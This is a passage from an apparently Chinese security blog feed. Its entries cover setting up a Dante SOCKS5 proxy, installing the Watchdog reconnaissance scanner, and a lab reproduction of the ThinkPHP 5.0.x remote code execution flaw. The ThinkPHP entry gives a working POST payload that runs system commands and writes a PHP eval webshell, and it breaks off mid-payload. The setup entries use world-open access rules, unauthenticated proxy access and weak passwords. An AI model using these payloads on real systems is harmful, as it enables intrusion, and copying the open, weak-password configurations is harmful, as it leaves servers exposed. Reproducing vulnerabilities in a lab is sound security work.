    <content type="html"><![CDATA[<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>1、安装 socks5<br><code>sudo apt-get install dante-server</code><br>安装完后可使用 <code>danted -v</code> 查看版本信息<br>2、创建日志文件<br><code>touch /var/log/socks5.log</code><br>3、创建用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd -s &#x2F;sbin&#x2F;nologin test -g proxy</span><br><span class="line">passwd test</span><br></pre></td></tr></table></figure><h2 id="二、danted-conf-配置文件常用参数"><a href="#二、danted-conf-配置文件常用参数" class="headerlink" title="二、danted.conf 配置文件常用参数"></a>二、danted.conf 配置文件常用参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#  指定日志文件保存的绝对路径</span><br><span class="line">logoutput:&#x2F;var&#x2F;log&#x2F;socks5</span><br><span class="line"></span><br><span class="line">#  绑定网卡跟端口</span><br><span class="line">internal: 0.0.0.0 port&#x3D;1080     #  进口 IP 或 网卡</span><br><span class="line">external: eth0 port&#x3D;1080        #  出口 IP 或 网卡</span><br><span class="line"></span><br><span class="line">#  设置 socks 身份验证方式</span><br><span class="line">socksmethod: username   #  如为 none 则表示不进行身份验证（rfc931）</span><br><span class="line">socksmethod: pam        #  pam 身份验证</span><br><span class="line"></span><br><span class="line">#  设置客户端规则</span><br><span class="line">clientmethod: none</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">user.privileged: proxy#  当做一些需要特权的事情时，会使用 proxy 用户的权限（默认有该行）</span><br><span class="line">user.unprivileged: nobody#  正常运行时，使用非特权用户 ID（默认有该行）</span><br><span class="line">#  如果编译时支持 libwrap，使用的用户 ID（ libwrap：服务程序安全增强工具，对有状态连接的特定服务进行安全检测并实现访问控制）</span><br><span class="line">user.libwrap: nobody#  默认有该行</span><br><span class="line"></span><br><span class="line">#  兼容性相关</span><br><span class="line">compatibility: sameport     #  当客户端连接后，socks 服务器将尝试使用与客户端使用的端口相同（需设置为 root 特权）</span><br><span class="line">compatibility: reuseaddr    #  允许端口复用（加了此行会报错，此处解释仅作参考）</span><br><span class="line"></span><br><span class="line">#  启用绑定扩展</span><br><span class="line">extension: bind</span><br><span class="line"></span><br><span class="line">#  超时设置</span><br><span class="line">timeout.negotiate: 30   #  设置连接超时时间</span><br><span class="line">timeout.io: 0        #  设置空闲超时时间（0 为永不超时）</span><br><span class="line"></span><br><span class="line">#  接受来自地址（DNS）的连接</span><br><span class="line">srchost: nodnsunknown nodnsmismatch</span><br><span class="line"></span><br><span class="line">#  设置访问规则</span><br><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 0.0.0.0&#x2F;0</span><br><span class="line">        clientmethod: rfc931#  匹配密码文件中的所有 ID 用户</span><br><span class="line">&#125;</span><br><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 0.0.0.0&#x2F;0</span><br><span class="line">        log: connect disconnect error#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line">socks pass &#123;</span><br><span class="line">       from: 10.0.0.0&#x2F;8 to: 0.0.0.0&#x2F;0</span><br><span class="line">        protocol: tcp udp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#  设置拒绝规则</span><br><span class="line">client block &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 to: 0.0.0.0&#x2F;0</span><br><span class="line">        log: connect disconnect error#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line">socks block &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 192.168.1.0&#x2F;24</span><br><span class="line">        log: connect disconnect error#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line">socks block &#123; </span><br><span class="line">        from: 0.0.0.0&#x2F;0 to: lo0</span><br><span class="line">        log: connect disconnect error#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line">socks block &#123;#  阻止任何其他地址连接到 example.com 域</span><br><span class="line">        from: 0.0.0.0&#x2F;0 to: .example.com port &#x3D; http</span><br><span class="line">        log: connect disconnect error#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#  添加路由（服务器链接）</span><br><span class="line">route &#123;</span><br><span class="line"> from: 10.0.0.0&#x2F;8 to: 0.0.0.0&#x2F;0 port &#x3D; http via: socks.example.net port &#x3D; socks</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、配置-SOCKS5"><a href="#三、配置-SOCKS5" class="headerlink" title="三、配置 SOCKS5"></a>三、配置 SOCKS5</h2><p>在 <code>danted.conf</code> 文件末尾添加如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#  指定日志文件保存的绝对路径</span><br><span class="line">logoutput: &#x2F;var&#x2F;log&#x2F;socks5.log</span><br><span class="line">#  进口 IP 或 网卡</span><br><span class="line">internal: eth0 port &#x3D; 8888</span><br><span class="line">#  进口网卡及端口</span><br><span class="line">internal: eth0 port &#x3D; 9999</span><br><span class="line">#  出口网卡</span><br><span class="line">external: eth0</span><br><span class="line">#  设置代理方式（rfc931）</span><br><span class="line">socksmethod: username none</span><br><span class="line">#  设置客户端规则</span><br><span class="line">clientmethod: none</span><br><span class="line">#  设置用户权限</span><br><span class="line">user.privileged: root</span><br><span class="line">#  非特权用户</span><br><span class="line">user.notprivileged: nobody</span><br><span class="line">#  如果编译时支持 libwrap，使用的用户 ID（ libwrap：服务程序安全增强工具，对有状态连接的特定服务进行安全检测并实现访问控制）</span><br><span class="line">user.libwrap: nobody</span><br><span class="line">#  设置访问规则</span><br><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 0.0.0.0&#x2F;0</span><br><span class="line">        #  记录连接、断开、报错信息</span><br><span class="line">        log: connect disconnect error</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">socks pass &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 0.0.0.0&#x2F;0</span><br><span class="line">        protocol: tcp udp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>停止服务：<code>systemctl stop danted</code><br>启动服务：<code>systemctl start danted</code><br>重启服务：<code>systemctl restart danted</code><br>查看服务状态：<code>systemctl status danted</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、安装&quot;&gt;&lt;a href=&quot;#一、安装&quot; class=&quot;headerlink&quot; title=&quot;一、安装&quot;&gt;&lt;/a&gt;一、安装&lt;/h2&gt;&lt;p&gt;1、安装 socks5&lt;br&gt;&lt;code&gt;sudo apt-get install dante-server&lt;/code&gt;&lt;</summary>
      
    
    
    
    <category term="代理" scheme="https://administratorrs.github.io/categories/%E4%BB%A3%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
    <category term="proxy" scheme="https://administratorrs.github.io/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>Watchdog</title>
    <link href="https://administratorrs.github.io/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/"/>
    <id>https://administratorrs.github.io/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/</id>
    <published>2021-02-10T16:00:00.000Z</published>
    <updated>2021-03-07T06:00:53.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装所需环境"><a href="#安装所需环境" class="headerlink" title="安装所需环境"></a>安装所需环境</h2><p>详细参考：<a href="https://github.com/CTF-MissFeng/Watchdog">https://github.com/CTF-MissFeng/Watchdog</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#  安装 Python</span><br><span class="line">sudo apt-get install python3 python3-pip -y</span><br><span class="line">#  安装 Python 相关环境</span><br><span class="line">sudo apt install build-essential libssl-dev libffi-dev python3-dev -y</span><br><span class="line"></span><br><span class="line">#  安装 Nmap</span><br><span class="line">sudo apt install nmap -y</span><br><span class="line">#  安装 Chromium 浏览器</span><br><span class="line">sudo apt-get install chromium-browser -y</span><br><span class="line"></span><br><span class="line">#  下载环境</span><br><span class="line">mkdir &#x2F;test</span><br><span class="line">cd &#x2F;test</span><br><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;CTF-MissFeng&#x2F;Watchdog.git</span><br><span class="line">#  安装文件内的库</span><br><span class="line">sudo pip3 install -r &#x2F;test&#x2F;Watchdog&#x2F;requirements.txt</span><br></pre></td></tr></table></figure><h2 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#  安装 PostgreSQL数据库</span><br><span class="line">sudo apt install postgresql postgresql-contrib -y</span><br><span class="line">#  指定 postgres 用户打开客户端工具 psql</span><br><span class="line">sudo -u postgres psql</span><br><span class="line">#  设置 postgres 用户密码（设置完后按 Ctrl + z 退出）</span><br><span class="line">\password postgres</span><br><span class="line"></span><br><span class="line">#  备份 PostgreSQL数据库 配置文件</span><br><span class="line">sudo cp -a &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf.bak_2021.2.8</span><br><span class="line"></span><br><span class="line">#  设置 PostgreSQL 数据库允许远程访问</span><br><span class="line">sudo sed -i &quot;60i listen_addresses &#x3D; &#39;*&#39;&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf</span><br><span class="line">sudo sed -i &quot;88i host  all  all 0.0.0.0&#x2F;0 md5&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;pg_hba.conf</span><br><span class="line"></span><br><span class="line">#  查看是否写入</span><br><span class="line">sed -n &quot;58,62p&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf</span><br><span class="line">sudo sed -n &quot;86,89p&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;pg_hba.conf</span><br></pre></td></tr></table></figure><h2 id="修改-Watchdog-配置文件"><a href="#修改-Watchdog-配置文件" class="headerlink" title="修改 Watchdog 配置文件"></a>修改 Watchdog 配置文件</h2><h3 id="修改-web-数据库连接设置"><a href="#修改-web-数据库连接设置" class="headerlink" title="修改 web 数据库连接设置"></a>修改 web 数据库连接设置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py.bak_2021.2.8</span><br><span class="line">#  修改 web 数据库连接设置</span><br><span class="line">sudo sed -i &#39;s&#x2F;postgres:\w\+&#x2F;postgres:admin&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py</span><br><span class="line">sudo sed -i &#39;s&#x2F;127.0.0.1\&#x2F;src&#x2F;127.0.0.1&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/set_config-1.png"></p><h3 id="修改-client-数据库连接配置"><a href="#修改-client-数据库连接配置" class="headerlink" title="修改 client 数据库连接配置"></a>修改 client 数据库连接配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py.bak_2020.2.8</span><br><span class="line">#  修改 client 数据库连接配置</span><br><span class="line">sudo sed -i &#39;s&#x2F;postgres:\w\+&#x2F;postgres:admin&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py</span><br><span class="line">sudo sed -i &#39;s&#x2F;127.0.0.1\&#x2F;src&#x2F;127.0.0.1&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py</span><br><span class="line"></span><br><span class="line">#  重启数据库服务</span><br><span class="line">sudo systemctl restart postgresql</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/set_config-2.png"></p><h3 id="添加-shodan-api"><a href="#添加-shodan-api" class="headerlink" title="添加 shodan api"></a>添加 shodan api</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py.bak_2021.2.8</span><br><span class="line">#  在域名扫描的工具模块内添加 shodan api（将此处命令中的 test 替换成 api）</span><br><span class="line">sudo sed -i &#39;s&#x2F;xxxxxx&#x2F;test&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/shodan_api.png"></p><h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#  修改测试账户的密码为12345678（测试账户密码需大于或等于 8 位，否则将无法登陆 web）</span><br><span class="line">sudo sed -i &#39;s&#x2F;qazxsw@123&#x2F;12345678&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;app.py</span><br><span class="line">#  配置环境变量</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog</span><br><span class="line">export FLASK_APP&#x3D;app.py:APP</span><br><span class="line">#  查看帮助文档</span><br><span class="line">sudo flask --help</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户（如没修改账号跟密码则默认为：root&#x2F;qazxsw@123）</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/start.png"></p><h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><h3 id="添加厂商"><a href="#添加厂商" class="headerlink" title="添加厂商"></a>添加厂商</h3><p>运行脚本前需添加厂商</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/web-1.png"></p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/web-2.png"></p><h3 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 启动子域名扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall</span><br><span class="line">sudo python3 -u sbudomain_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u sbudomain_run.py &gt; dns.log 2&gt;&amp;1 &amp;</span><br><span class="line"># 查看日志</span><br><span class="line">cat dns.log</span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 启动端口扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;portscan</span><br><span class="line">sudo python3 -u portscan_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u portscan_run.py &gt; port.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat port.log</span><br></pre></td></tr></table></figure><h3 id="url-扫描"><a href="#url-扫描" class="headerlink" title="url 扫描"></a>url 扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 启动url扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;urlscan&#x2F;url_probe  </span><br><span class="line">sudo python3 -u urlscan_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u urlscan_run.py &gt; url.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat url.log</span><br></pre></td></tr></table></figure><h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 启动xray</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;urlscan&#x2F;xray</span><br><span class="line">sudo python3 -u xray_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u xray_run.py &gt; xray.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat xray.log</span><br></pre></td></tr></table></figure><h3 id="重置环境"><a href="#重置环境" class="headerlink" title="重置环境"></a>重置环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#  进入 Watchdog 目录</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog</span><br><span class="line">#  重置数据库</span><br><span class="line">sudo flask resetdb</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装所需环境&quot;&gt;&lt;a href=&quot;#安装所需环境&quot; class=&quot;headerlink&quot; title=&quot;安装所需环境&quot;&gt;&lt;/a&gt;安装所需环境&lt;/h2&gt;&lt;p&gt;详细参考：&lt;a href=&quot;https://github.com/CTF-MissFeng/Watchdog</summary>
      
    
    
    
    <category term="信息收集" scheme="https://administratorrs.github.io/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="https://administratorrs.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.0.2 - 5.0.23 RCE 漏洞复现</title>
    <link href="https://administratorrs.github.io/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/"/>
    <id>https://administratorrs.github.io/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/</id>
    <published>2021-02-10T16:00:00.000Z</published>
    <updated>2021-02-17T06:21:50.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的。最早诞生于2006年初，2007年元旦正式更名为ThinkPHP，并且遵循Apache2开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>ThinkPHP5 5.0.2 - 5.0.23</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><p>测试环境：ThinkPHP_5.0.22<br><a href="http://www.thinkphp.cn/donate/download/id/1260.html?__cf_chl_jschl_tk__=2d60761f086ace0ca0fd80f8d46b2043d9f844b1-1610970960-0-AbyMemrR-Tnnk2tMvVITwZ3AfrjPWPkp95Xb244JjneXgQGhmYKbSlTPo__l-jK-KVZCyUzkUwhTTZPmKCWbxc7roIfajMxDDZkxqPluw3D18svMPwAYOehIzV_I1hdnzg558pTFF7INimMKDhcNvwTak7VzuegJKyCY20EVc2PFvGWTLvdyXj-w2xDnNTdTldLg3Wenmsw_B6oZpC2aUUVnKJwJy1Z0JXoVeaRTmDlMZhB7knKynX0AgVCMI34Qhqb-k-A28mOzO8UpBKGv6y3ANxQPXEI3Gg0_nKO81VsWrrBZeqwjGPJEPu5pNnW6sukhE-l4RfZs_E3yrq3lmQU">ThinkPHP_5.0.22下载</a><br>下载完后解压到 phpstudy 的 www 文件夹内<br>访问 <a href="http://127.0.0.1/thinkphp/public/">http://127.0.0.1/thinkphp/public/</a> 可看到页面<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/1.jpg"></p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、访问 <a href="http://127.0.0.1/thinkphp/public/index.php?s=captcha">http://127.0.0.1/thinkphp/public/index.php?s=captcha</a> 并抓包</p><p>2、构建 POC 并发包<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/2.png"></p><p>3、使用蚁剑连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/3.png"></p><p>POC：<br>通过发包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Linux）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo &quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot; &gt; 1.php</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Windows）</span><br><span 